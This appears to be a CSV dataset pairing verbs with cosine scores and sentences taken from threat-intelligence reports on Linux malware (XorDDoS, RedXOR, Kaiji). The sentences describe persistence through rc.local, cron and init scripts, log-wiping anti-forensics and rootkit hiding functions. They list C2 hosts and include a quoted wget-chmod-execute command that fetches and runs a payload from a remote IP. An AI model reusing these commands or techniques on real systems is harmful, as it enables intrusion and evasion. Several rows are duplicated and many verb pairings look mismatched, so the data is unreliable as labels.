,verb_origin,verb_altern,cosine,sentence
29,modify,modify,cos: 0.9792,"trend micro researchers also discovered that the latest variant of the aesddos bot can modify files i.e., /etc/rc.local and /etc/rc.d/rc.local, as an autostart technique by appending the {malware path}/{malware file name} reboot command."
33,add,add,cos: 0.9717,persistence persistence is achieved by the malware by adding to /etc/rc.local and the /etc/init.d/boot.local files (in the auto_boot function); however before it overwrites this file it first checks to see if it has already done so.
35,gather,gather,cos: 0.9699,this backdoor gathers the following data:  cpu information memory statistics ip address of infected machine reads the following information from /proc: /proc/stat /proc/meminfo /proc/cpuinfo /proc/net/dev /proc/self/exe /proc/self/maps /proc/sys/vm/overcommit_memory /proc/sys/kernel/rtsig-max /proc/sys/kernel/ngroups_max /proc/sys/kernel/osrelease /proc/self/fd/%d/%s /proc/self/fd /proc/net other details
0,retrieve,create,cos: 0.8269,retrieve data from a file or directory
1,extract,extract,cos: 0.8255,table 2: data collected by the malware and sent back to the c2 serverurl key	description	commenthostip	ip	hardcoded to 127.0.0.1softtype		hardcoded to “linux”pscaddr	mac address	hostname	machine name	hosttar	username	possibly “host target”hostos	distribution	extracted from /etc/issue or /etc/redhat-releasehostcpu	clock speed	/proc/cpuinfohostmem	amount of memory	/proc/meminfohostpack		hardcoded to “linux”lkmtag	is rootkit enabled	kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.
23,drop,drop,cos: 0.8050,figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf
5,create,create,cos: 0.7918,"if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/."
16,use,create,cos: 0.7617,xorddos uses /proc/rs_dev character device to communicate with the rootkit.
12,pass,drop,cos: 0.7398,cron scriptthe malware creates a cron script at the location /etc/cron.hourly/gcc.sh.the cron script passes parameters with the following content:screenshot of the contents of the gcc.sh script.
4,read,look,cos: 0.7303,"it performs the following tasks:reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string."
11,have,add,cos: 0.6998,"in this case, the malware has a provision for communicating with its rootkit component /proc/rs_dev by sending input and output control (ioctl) calls with additional information to take appropriate action."
28,connect,look,cos: 0.6836,the malware also connects to 23.224.59.34:48080 to send and receive remote shell commands from the attacker.
31,open,open,cos: 0.6696,the virtual file /proc/cpuinfo is opened and read in words until an eof (-1) is hit whilst reading the file chunk by chunk — then fclose is called to free up the opened file.
19,provide,create,cos: 0.6674,"the following table describes the symbols found in the rootkit and their corresponding functionalities:function name  	description  give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0”module_hide	hides the rootkit kernel modulemodule_show	unhides the rootkit kernel moduleget_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6hide_udp4_port	adds a provided port to a list of hidden udp4 portsunhide_udp4_port	deletes a provided port from a list of hidden udp4 portshide_udp6_port	adds a provided port to a list of hidden udp6 portsunhide_udp6_port	deletes a provided port from a list of hidden udp6 portshide_tcp4_port	adds a provided port to a list of hidden tcp4 portsunhide_tcp4_port	deletes a provided port from a list of hidden tcp4 portshide_tcp6_port	adds a provided port to a list of hidden tcp6 portsunhide_tcp6_port	deletes a provided port from a list of hidden tcp6 portsunhide_allz	iterates list of all hidden ports and deletes all entriesfirewall_acceptip	adds an ip address provided to accept_ips listunfirewall_acceptip	deletes a provided entry from accept_ips listfirewall_dropip	adds a provided ip address to drop_ips listunfirewall_dropip	deletes a provided ip address to drop_ips listhide_proc	adds a provided entry to hidden_procs listunhide_proc	deletes a provided entry to hidden_procs list"
30,connect,communicate,cos: 0.6585,the malware also connects to 23.224.59.34:48080 to send and receive remote shell commands from the attacker.
18,contain,create,cos: 0.6368,"a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:/proc/7728 – contains process-id (pid) 7728-related information/proc/698 – contains pid 698-related informationrunning the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command."
15,check,create,cos: 0.6368,"a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:/proc/7728 – contains process-id (pid) 7728-related information/proc/698 – contains pid 698-related informationrunning the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command."
13,delete,place,cos: 0.6164,it then creates a /etc/crontab file to run /etc/cron.hourly/gcc.sh every three minutes:screenshot displaying the system command to delete the /etc/cron.hourly/gcc.sh entry from /etc/crontab file and add a new entry.
21,fetch,download,cos: 0.6091,"after decoding the urls, it adds them into a remote list, which is later used to communicate and fetch commands from the command and control (c2) server:www.enoan2107.com:3306www.gzcfr5axf6.com:3306malicious activity threadsafter creating persistent entries, deleting evidence of its activities, and decoding config.rar, the malware initializes a cyclic redundancy check (crc) table followed by an unnamed semaphore using the sem_init api."
10,run,set,cos: 0.5896,"after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character:sensitive file	description/root/.bash_history	contains the commands that were run earlier/var/log/wtmp	contains login related record for users/var/log/btmp	contains record of failed login attempt/var/log/lastlog	contains the recent login information for users/var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges/var/log/boot.log	contains information related to system boot and message logged via system startup processes/var/log/cron	contains information related to cron job launch, success and failure error logs/var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc."
9,relate,set,cos: 0.5896,"after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character:sensitive file	description/root/.bash_history	contains the commands that were run earlier/var/log/wtmp	contains login related record for users/var/log/btmp	contains record of failed login attempt/var/log/lastlog	contains the recent login information for users/var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges/var/log/boot.log	contains information related to system boot and message logged via system startup processes/var/log/cron	contains information related to cron job launch, success and failure error logs/var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc."
32,read,set,cos: 0.5849,the way the malware gets information regarding the network adapter is reading the /proc/net/dev file.
14,call,fetch,cos: 0.5614,"before handling the argument-based control, it calls the readlink api with the first parameter as /proc/self/exe to fetch its full process path."
22,download,download,cos: 0.5514,download urlswww.enoan2107.com:3306www.gzcfr5axf6.com:3306hxxp://aa.hostasa.org/config.rar
24,find,spawn,cos: 0.5041,the fake commands can include:cat resolv.confnetstat -anbashwhoamiidcd /etcifconfig eth0ifconfigecho “find”uptimeshtopgnome-terminalsunetstat -antopgrep “a”whols -lapwdroute -nps -eflssleep 1
8,contain,set,cos: 0.4812,"after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character:sensitive file	description/root/.bash_history	contains the commands that were run earlier/var/log/wtmp	contains login related record for users/var/log/btmp	contains record of failed login attempt/var/log/lastlog	contains the recent login information for users/var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges/var/log/boot.log	contains information related to system boot and message logged via system startup processes/var/log/cron	contains information related to cron job launch, success and failure error logs/var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc."
2,hardcode,connect,cos: 0.4605,table 2: data collected by the malware and sent back to the c2 serverurl key	description	commenthostip	ip	hardcoded to 127.0.0.1softtype		hardcoded to “linux”pscaddr	mac address	hostname	machine name	hosttar	username	possibly “host target”hostos	distribution	extracted from /etc/issue or /etc/redhat-releasehostcpu	clock speed	/proc/cpuinfohostmem	amount of memory	/proc/meminfohostpack		hardcoded to “linux”lkmtag	is rootkit enabled	kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.
3,resolv.conf,write,cos: 0.4395,encrypted strings	decoded valuem7a4nq_/na	/usr/bin/m [(n3	/bin/m6_6n3	/tmp/m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pidm.[$n__#4%\c\x1ab]0	/lib/libudev.som.[$n3	/lib/m4s4nac/na	/var/run/!#ff3ve.-7\x17v[_	cat resolv.conf<encrypted_remote_url>	hxxp://aa.hostasa[.
34,format,fork,cos: 0.4292,"a string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example)."
26,find,download,cos: 0.4166,indicators of compromisekaijifile name	sha 256	trend micro pattern detection123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	trojan.sh.kaiji.alinux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	ddos.linux.kaiji.arelated urls:http://62.171.160.189/linux_armhttp://62.171.160.189/11/123.shxorddos and other malware variants found through the same urlsha 256	trend micro pattern detectiondba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	backdoor.linux.xorddos.ae6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	backdoor.linux.dofloo.ab286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	backdoor.win32.sddos.arelated url:http://122.51.133.49:10086/vip
20,name,set,cos: 0.3891,"utilities, such as netstat, acquire tcp/udp connection information from files named /proc/net/tcp and /proc/net/udp."
27,wget,get,cos: 0.3874,"afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:wget http://122.51.133.49:10086/vip –o vipchmod 777 vip./vipthe xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server."
7,m6_6n3,set,cos: 0.3807,encrypted strings	decoded valuem7a4nq_/na	/usr/bin/m [(n3	/bin/m6_6n3	/tmp/m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pidm.[$n__#4%\c\x1ab]0	/lib/libudev.som.[$n3	/lib/m4s4nac/na	/var/run/!#ff3ve.-7\x17v[_	cat resolv.conf<encrypted_remote_url>	hxxp://aa.hostasa[.
38,se,start,cos: 0.3779,installation  this backdoor adds the following processes:  sed -i -e '/exit/d' /etc/rc.local sed -i -e '/^\r\n
17,hook,access,cos: 0.3542,"the following table describes the symbols found in the rootkit and their corresponding functionalities:function name  	description  give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0”module_hide	hides the rootkit kernel modulemodule_show	unhides the rootkit kernel moduleget_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6hide_udp4_port	adds a provided port to a list of hidden udp4 portsunhide_udp4_port	deletes a provided port from a list of hidden udp4 portshide_udp6_port	adds a provided port to a list of hidden udp6 portsunhide_udp6_port	deletes a provided port from a list of hidden udp6 portshide_tcp4_port	adds a provided port to a list of hidden tcp4 portsunhide_tcp4_port	deletes a provided port from a list of hidden tcp4 portshide_tcp6_port	adds a provided port to a list of hidden tcp6 portsunhide_tcp6_port	deletes a provided port from a list of hidden tcp6 portsunhide_allz	iterates list of all hidden ports and deletes all entriesfirewall_acceptip	adds an ip address provided to accept_ips listunfirewall_acceptip	deletes a provided entry from accept_ips listfirewall_dropip	adds a provided ip address to drop_ips listunfirewall_dropip	deletes a provided ip address to drop_ips listhide_proc	adds a provided entry to hidden_procs listunhide_proc	deletes a provided entry to hidden_procs list"
6,fetch,fetch,cos: 0.3169,"kill_processthe kill_process thread performs the following tasks:decodes encrypted stringsfetches file stats for /var/run/gcc.pid or, if none exist, then creates the filefetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.sofetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current processreads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as:md5=filename=rmfile=denyip=tcp_threadthe tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr()."
25,read,access,cos: 0.3168,creates symbolic links which points to the script in /etc/init.d:/etc/rc{1-5}.d/s90{random numbers}/etc/rc.d/rc{1-5}.d/s90{random numbers}get the magic string value from the file /var/run/gcc.pidread the following from its configuration file:md5 - checksum of filedenyip - open communication with an ipfilename - list of filenamermfile - files to remove
36,se,set,cos: 0.2901,installation  this backdoor adds the following processes:  sed -i -e '/exit/d' /etc/rc.local sed -i -e '/^\r\n
37,start,set,cos: 0.2901,installation  this backdoor adds the following processes:  sed -i -e '/exit/d' /etc/rc.local sed -i -e '/^\r\n
